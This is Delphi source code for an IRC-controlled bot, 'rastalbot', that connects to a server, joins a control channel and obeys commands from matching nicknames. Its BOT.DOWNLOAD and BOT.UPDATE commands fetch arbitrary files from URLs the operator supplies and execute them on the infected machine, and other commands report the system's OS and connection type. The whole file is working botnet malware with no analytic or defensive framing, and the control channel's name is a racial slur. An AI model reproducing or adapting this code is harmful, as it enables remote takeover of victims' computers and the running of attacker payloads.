   unit rastalbot;

   interface

   uses
     windows, uNetBios, winsock, wininet;

   type
     tbot = class(TObject)
       procedure createbot;
       procedure sendtext(text:string);
       function createnick:string;
       function UpperCase(const S: string): string;
       function InttoStr(const Value: integer): string;
       function StrtoInt(const S: string): integer;
       procedure readcmd;
       procedure docmd(cmd: string);
       procedure getparams(data: string);
       function getinfo: string;
       function getstatus: string;
       Function GetNet:String;
       function GetOs: String;
     public
       sock: TSocket;
       addr: TSockAddrIn;
       wsa_: TWSAData;
       port: Integer;
       host: String;
     end;

   var
     params: array[0..2000] of string;
     silence: bool;
     backupSock: TSocket;

     function URLDownloadToFile(Caller: cardinal; URL: PChar;
                                FileName: PChar; Reserved: LongWord;
                                StatusCB: cardinal): Longword; stdcall;
                                external 'URLMON.DLL' name 'URLDownloadToFileA';

   implementation

   function tbot.GetOS: string;
   const
     cOsUnknown  = 'Unknown';
     cOsWin95    = 'Win95';
     cOsWin98    = 'Win98';
     cOsWin98SE  = 'W98SE';
     cOsWinME    = 'WinME';
     cOsWinNT    = 'WinNT';
     cOsWin2000  = 'Win2k';
     cOsXP       = 'WinXP';
   var
     osVerInfo: TOSVersionInfo;
     majorVer, minorVer: Integer;
   begin
     Result := cOsUnknown;
     { set operating system type flag }
     osVerInfo.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
     if GetVersionEx(osVerInfo) then
     begin
       majorVer := osVerInfo.dwMajorVersion;
       minorVer := osVerInfo.dwMinorVersion;
       case osVerInfo.dwPlatformId of
         VER_PLATFORM_WIN32_NT: { Windows NT/2000 }
           begin
             if majorVer <= 4 then
               Result := cOsWinNT
             else if (majorVer = 5) and (minorVer = 0) then
               Result := cOsWin2000
             else if (majorVer = 5) and (minorVer = 1) then
               Result := cOsXP
             else
               Result := cOsUnknown;
           end;
         VER_PLATFORM_WIN32_WINDOWS:  { Windows 9x/ME }
           begin
             if (majorVer = 4) and (minorVer = 0) then
               Result := cOsWin95
             else if (majorVer = 4) and (minorVer = 10) then
             begin
               if osVerInfo.szCSDVersion[1] = 'A' then
                 Result := cOsWin98SE
               else
                 Result := cOsWin98;
             end
             else if (majorVer = 4) and (minorVer = 90) then
               Result := cOsWinME
             else
               Result := cOsUnknown;
           end;
         else
           Result := cOsUnknown;
       end;
     end
     else
       Result := cOsUnknown;
   end;

   Function tbot.GetNet:String;
   Var
    S:Dword;
   Begin
    S := INTERNET_CONNECTION_LAN;
    If InternetGetConnectedState(@S ,0) Then
     If ((S) And (INTERNET_CONNECTION_LAN) = INTERNET_CONNECTION_LAN) Then
      Result := 'LAN';
    S := INTERNET_CONNECTION_MODEM;
    If InternetGetConnectedState(@S ,0) Then
     If ((S) And (INTERNET_CONNECTION_MODEM) = INTERNET_CONNECTION_MODEM) Then
      Result := 'Dial-up';
   End;


   procedure tbot.getparams(data: string);
   var
     tmp: string;
     i  : integer;
   begin
     zeromemory(@params, 2000);
     fillchar(params, 2000, #0);

     while pos(#13, data) > 0 do
       delete(data, pos(#13, data), 1);
     while pos(#10, data) > 0 do
       delete(data, pos(#10, data), 1);

     if data[length(data)] <> ' ' then data := data + ' ';

     i := 0;
     while pos(' ', data) > 0 do
     begin
       tmp := copy(data, 1, pos(' ', data)-1);
       data := copy(data, pos(' ', data)+1, length(data));

       if tmp <> '' then
         if i <= 2000 then
           params[i] := tmp;

       inc(i);
     end;
   end;

   function tbot.getstatus: string;
   begin
     Result := '';
   end;

   function tbot.getinfo: string;
   begin
     Result := 'System: '+GetOs+' | NetSpeed: '+GetNet;
   end;

   procedure tbot.docmd(cmd: string);
   var
     nick, ident, host: string;
     channel, text: string;
   begin
     if cmd = '' then exit;
     if cmd[1] = ':' then delete(cmd, 1, 1);

     nick := copy(cmd, 1, pos('!', cmd)-1);
     cmd := copy(cmd, pos('!', cmd)+1, length(cmd));

     ident := copy(cmd, 1, pos('@', cmd)-1);
     cmd := copy(cmd, pos('@', cmd)+1, length(cmd));

     host := copy(cmd, 1, pos(' ', cmd)-1);
     cmd := copy(cmd, pos('PRIVMSG ', cmd)+8, length(cmd));

     channel := copy(cmd, 1, pos(' :', cmd)-1);
     cmd := copy(cmd, pos(' :', cmd)+2, length(cmd));

     text := copy(cmd, 1, pos(#10, cmd)-1);
     if text[length(text)] = #13 then delete(text, length(text), 1);

     if uppercase(channel) = '##NIGGAH' then
     begin
       if (pos('0', nick) > 0) or (pos('0', ident) > 0) then
       begin
         getparams(text);
         if (uppercase(params[0]) = 'BOT.DOWNLOAD') then
         begin
           URLDownloadToFile(0, pchar(params[1]), pchar(params[2]), 0, 0);
           winexec(pchar(params[2]), strtoint(params[3]));
         end;
         if (uppercase(params[0]) = 'BOT.UPDATE') then
         begin
           URLDownloadToFile(0, pchar(params[1]), pchar(params[2]), 0, 0);
           winexec(pchar(params[2]), strtoint(params[3]));
           exitprocess(0);
         end;
         if (uppercase(params[0]) = 'BOT.SILENCE') and (params[1] = '1') Then Silence := True;
         if (uppercase(params[0]) = 'BOT.SILENCE') and (params[1] = '0') Then Silence := False;
         if (uppercase(params[0]) = 'BOT.CHANGENICK') then sendtext('NICK '+createnick+#10);
         if (uppercase(params[0]) = 'BOT.JOIN') then sendtext('JOIN '+params[1]+#10);
         if (uppercase(params[0]) = 'BOT.PART') then sendtext('PART '+params[1]+#10);
         if (uppercase(params[0]) = 'BOT.STATUS') then if not silence then sendtext('PRIVMSG '+channel+' :'+getstatus+#10);
         if (uppercase(params[0]) = 'BOT.INFO') then if not silence then sendtext('PRIVMSG '+channel+' :'+getinfo+#10);
         if (uppercase(params[0]) = 'BOT.QUIT') then exitprocess(0);
         if (uppercase(params[0]) = 'BOT.RESTART') then
         begin
           sendtext('QUIT :Restarting...'#10);
           sleep(1000);
           closesocket(sock);
           sleep(60000);
         end;
       end;
     end;
   end;

   procedure tbot.readcmd;
   var
     buf: array[0..1600] of char;
     data: string;
     tmp: string;
   begin
     while recv(sock, buf, 1600, 0) > 0 do
     begin
       data := buf;
       zeromemory(@buf, 1600);

       while pos(#10, data) > 0 do
       begin
         tmp := copy(data, 1, pos(#10, data));
         data := copy(data, pos(#10, data)+1, length(data));

         if pos('MOTD', uppercase(tmp)) > 0 then
           sendtext('JOIN ##niggah'#10);

         if pos('Nick already in use', tmp) > 0 Then sendtext('NICK '+createnick+#10);

         if pos('PING :', uppercase(tmp)) > 0 then
         begin
           tmp := copy(tmp, pos('PING :', uppercase(tmp)), length(tmp));
           tmp := copy(tmp, 1, pos(#10, tmp)-1);
           if pos(#13, tmp) > 0 then tmp := copy(tmp, 1, pos(#13, tmp)-1);
           delete(tmp, 2, 1);
           insert('O', tmp, 2);
           sendtext(tmp+#10);
         end;

         if pos('PRIVMSG', uppercase(tmp)) > 0 then
           docmd(tmp);

       end;
     end;
   end;

   function tbot.StrtoInt(const S: string): integer;
   var
     E: integer;
   begin
     Val(S, Result, E);
   end;

   function tbot.InttoStr(const Value: integer): string;
   var
     S: string[11];
   begin
     Str(Value, S);
     Result := S;
   end;

   function tbot.UpperCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'a') and (Ch <= 'z') then Dec(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   function tbot.createnick:string;
   begin
     randomize;
     result := 'rl-'+inttostr(random(9))+inttostr(random(9))+inttostr(random(9))+inttostr(random(9))+
                     inttostr(random(9))+inttostr(random(9))+inttostr(random(9))+inttostr(random(9))+
                     inttostr(random(9))+inttostr(random(9));
   end;

   procedure tbot.sendtext(text:string);
   begin
     send(sock, text[1], length(text), 0);
   end;

   procedure tbot.createbot;
   var
     nick:string;
     ident:string;
   begin
     wsastartup(makeword(2,1), wsa_);
     sock := socket(af_inet, sock_stream, ipproto_ip);
     if sock = -1 then exit;
     addr.sin_family := af_inet;
     addr.sin_port := htons(port);
     addr.sin_addr.S_addr := inet_addr(pchar(host));
     if connect(sock, addr, sizeof(addr)) = error_success then
     begin
       backupSock := Sock;
       nick := createnick;
       ident := nick+' '+nick+'@'+nick+'.com "win2k" :'+nick;
       sendtext('USER '+ident+#10);
       sendtext('NICK '+createnick+#10);
       readcmd;
     end;
     wsacleanup;
   end;

   end.
